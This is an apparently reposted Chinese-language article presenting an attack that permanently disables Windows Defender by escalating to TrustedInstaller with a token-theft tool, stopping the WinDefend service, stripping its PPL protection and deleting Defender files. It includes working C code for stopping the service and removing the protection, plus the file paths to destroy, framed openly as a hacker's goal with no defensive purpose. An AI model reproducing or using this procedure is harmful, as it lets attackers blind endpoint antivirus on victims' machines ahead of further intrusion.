> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wMM_CyFvx18J0x1xKMvWGQ)

**描述**
======

可以关闭 Windows Defender 服务并通过提升权限删除 ppl 保护，然后删除 Windows Defender 中的 DLL 和其他文件，使 Windows Defender 服务无法运行，从而导致 Windows Defender 拒绝服务。

**攻击步骤**

**1. 将权限升级到 trustedinstaller**

我们使用受信任的安装程序组令牌自动窃取系统令牌，以提升到受信任的安装程序权限，  

在这里，我们使用一个开源工具来利用它：

```
https://github.com/0xbadjuju/Tokenvator.
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDI5VOtlXOnGSaQ6USb6Vs8Vwjl7rKn7E3yPRMVeyUJ6yicwMKOtibucpQchtT6nFdHPmAV4H0NicaGA/640?wx_fmt=png)

提权到 TrustedInstaller 并使用这个权限打开一个新的 CMD.exe

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDI5VOtlXOnGSaQ6USb6Vs80QibHTnh3EbKelIdNNcxR7aibMCM2PE0HLafVYZzca2NqBP840O7CdKQ/640?wx_fmt=png)

同时这个 cmd.exe 也拥有 TrustedInstaller 权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDI5VOtlXOnGSaQ6USb6Vs8n6xhNt50icyOHMVeCJzzX0OtZKBCgKNd6ibKGTCWPjicwxcpZzytz2jMg/640?wx_fmt=png)

**2. 关闭 Windows Defender 服务**
-----------------------------

这个其实并不是漏洞，因为我们的 administrator 权限也可以直接临时关闭 Windows Defender 服务。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDI5VOtlXOnGSaQ6USb6Vs8VWE8icbMtjYOvvGwrq0ysoz70GFls5NVyLmRTWp1k7nMX5FRsh7klzA/640?wx_fmt=png)

但是这样关闭 Windows Defender 服务可以手工打开和重启会自动打开，我们想要的是永远关闭 Windows Defender 服务，在黑客的想法中就是目标无论如何都没有办法再次启动 Windows Defender 服务，当然重装系统除外。哈哈哈....

**3. 移除 PsProtectSignerAntimalware-Light 保护**
---------------------------------------------

关于 “保护” 的快速背景:

保护进程首先出现在 windows vista 中，作为对关键 windows 用户模式服务的增强，后来在 windows 8.1 中演变为保护进程 (PPL). 一般来说可执行文件必须使用特殊证书进行签名，然后才有可能使用保护进程 (PPL)。

在微软文档中我们可以知道：

```
https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-changeserviceconfig2w
```

只要我们对服务对象有足够的访问权限，就可以更改服务保护。也就是说我们可以关闭 Windows Defender 服务的 PPL。经过我们测试知道服务 ACL 根本不允许 SYSTEM 用户和管理员组修改或停止 Windows Defender 服务。但它允许 WinDefend 和 TrustedInstaller 修改或停止 Windows Defender 服务的 ppl，那么上面我们拥有了完整的 TrustedInstaller 权限。

那么我们可以禁用 Windows Defender 服务的 PsProtectSignerAntimalware-Light，然后可以修改和删除 Windows Defender 的运行必要组件来达到使永远关闭 Windows Defender 服务的目的。

Windows Defender 的文件保存路径为：

```
C:\Program Files\Windows Defender
C:\Program Files\Windows Defender Advanced Threat Protection
C:\Program Files (x86)\Windows Defender
```

在有 PPL 的情况下我们无法对这些文件进行任何修改。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDI5VOtlXOnGSaQ6USb6Vs8MCtyztAD3ppGjfNzmnXccEfU4LU99icJGMouvXd0NXbysrSyKSydYhw/640?wx_fmt=png)

同样在 TrustedInstaller 权限中也无法进行修改等等操作。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDI5VOtlXOnGSaQ6USb6Vs8k5o0xQkP37yX7m0regdmuE6J1UnLwtf0V31Y4qoLt3YHovLHfqWRmA/640?wx_fmt=png)

那么我们可以使用 TrustedInstaller 权限通过 ChangeServiceConfig2W 来停止 PsProtectSignerAntimalware-Light 保护，然后修改和删除 Windows Defender 的运行必要组件来达到使永远关闭 Windows Defender 服务的目的。

```
SC_HANDLE tt = OpenSCManager(NULL, NULL, GENERIC_READ);//建立服务控制管理器的连接
  SC_HANDLE windefend_svc = OpenServiceW(tt, L"WinDefend", SERVICE_START | SERVICE_STOP | GENERIC_READ | SERVICE_CHANGE_CONFIG | SERVICE_USER_DEFINED_CONTROL);
  //打开一个已经存在的服务 打开wdf的服务
  if (windefend_svc == NULL) {
    printf("\n[-] Failed to open WinDefend service.");
    return 1;
  }
  printf("Done.\n");


  SERVICE_STATUS svc_status;
  if (!ControlService(windefend_svc, SERVICE_CONTROL_STOP, &svc_status)) {
    //停止WDF服务
    printf("[-] Failed to stop WinDefend service :(");
    return 1;
  }
  printf("[+] Successfully sent service stop control.\n");
  SERVICE_LAUNCH_PROTECTED_INFO info;
  DWORD ret_sz = 0;


  QueryServiceConfig2W(windefend_svc, SERVICE_CONFIG_LAUNCH_PROTECTED, (LPBYTE)&info, sizeof(SERVICE_LAUNCH_PROTECTED_INFO), &ret_sz);
  //检索WDF服务的可选配置参数。
  if (info.dwLaunchProtected == SERVICE_LAUNCH_PROTECTED_NONE)
    goto WaitDefender;
  info.dwLaunchProtected = SERVICE_LAUNCH_PROTECTED_NONE;
  if (!ChangeServiceConfig2W(windefend_svc, SERVICE_CONFIG_LAUNCH_PROTECTED, &info)) {
    printf("[-] Failed to remove PsProtectSignerAntimalware-Light from WinDefend service :(");
    return 1;
  }
  printf("[+] Successfully removed PsProtectSignerAntimalware-Light from WinDefend service.\n");
WaitDefender:
  printf("[*] Waiting WinDefend to stop .!\n");
  WaitForSingleObject(hwindefend, INFINITE);
  CloseHandle(hwindefend);
  printf("[!] Attempting to unload WdFilter.sys ... ");
```

然后修改修改和删除 Windows Defender 的运行必要组件来达到使永远关闭 Windows Defender 服务的目的。